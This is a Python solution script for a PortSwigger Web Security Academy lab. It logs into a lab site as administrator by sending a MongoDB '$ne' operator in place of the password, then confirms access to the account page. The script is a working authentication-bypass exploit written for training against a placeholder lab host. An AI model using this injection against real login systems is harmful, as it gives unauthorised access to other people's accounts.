"""
Lab 2: Exploiting NoSQL operator injection to bypass authentication
https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication
Difficulty: Apprentice

📝 Apply the $ne operator trick to actually SUCCEED, not just change the
error — against any real account, {"password": {"$ne": "wrong-guess"}}
matches as long as their real password isn't literally "wrong-guess",
which is true for virtually any account including administrator.
"""

from utils import get_session, login_attempt, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
LOGIN_PATH = "/login"


def run():
    s = get_session()

    note("Logging in as administrator using $ne against a password we know")
    note("is wrong — no credentials needed beyond the username itself.")

    r = login_attempt(s, f"{TARGET}{LOGIN_PATH}", "administrator",
                       {"$ne": "definitely-not-the-real-password"})
    log(f"Status: {r.status_code}")
    print(r.text[:300])

    r2 = s.get(f"{TARGET}/my-account")
    log(f"/my-account status: {r2.status_code}")
    log(f"Logged in as administrator: {'administrator' in r2.text.lower()}")


if __name__ == "__main__":
    run()
